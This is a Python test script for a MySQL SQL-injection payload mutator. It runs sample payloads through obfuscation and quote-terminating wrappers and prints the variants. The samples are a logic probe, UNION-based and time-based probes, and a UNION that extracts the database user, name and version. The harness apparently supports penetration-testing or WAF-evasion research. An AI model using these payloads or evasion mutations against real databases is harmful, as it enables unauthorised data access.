import sys
import os

# Add backend to path so we can import modules
sys.path.append(os.path.abspath("/app/applet/backend"))

from core.mutator_ast import ASTMutator

def main():
    print("="*50)
    print(" MySQL Exclusive AST Mutator Test ".center(50, "="))
    print("="*50)

    # Initialize in SINGLE_QUOTE context
    mutator = ASTMutator(context="SINGLE_QUOTE")
    
    # Test base payloads representing different stages of attacks
    base_payloads = [
        "OR 1=1",                                      # Logic probe
        "UNION SELECT 1,2,3,4",                       # Simple UNION
        "AND (SELECT SLEEP(5))",                      # Time based
        "UNION SELECT NULL, USER(), DATABASE(), VERSION()" # Exfiltration
    ]

    print("\n[*] Testing Semantic Mutation (Direct AST Traversal):")
    for payload in base_payloads:
        # We manually call _semantic_symbol_mutation to isolate the new MySQL specialized logic
        mutated = mutator._semantic_symbol_mutation(payload)
        
        # Then we wrap it using the context isolator to demonstrate the terminator tactics
        wrapped = mutator._context_aware_wrap(mutated)
        print(f"  [Original] : {payload}")
        print(f"  [AST + Wrap]: {wrapped}")
        print("-" * 40)

    print("\n[*] Testing Full Mutation Pipeline (`mutate` with intensity):")
    for payload in base_payloads:
        mutated_full = mutator.mutate(payload, intensity=2)
        print(f"  [Original] : {payload}")
        print(f"  [Pipeline] : {mutated_full}")
        print("-" * 40)
        
    print("\n[*] Testing Wrapper Resiliency (Stacked Strings):")
    dirty_payload = "')')))) OR 1=1 /*!*//*junk*/ "
    clean_mutation = mutator.mutate(dirty_payload, intensity=1)
    print(f"  [Dirty]    : {dirty_payload}")
    print(f"  [Cleaned]  : {clean_mutation}")


if __name__ == "__main__":
    main()
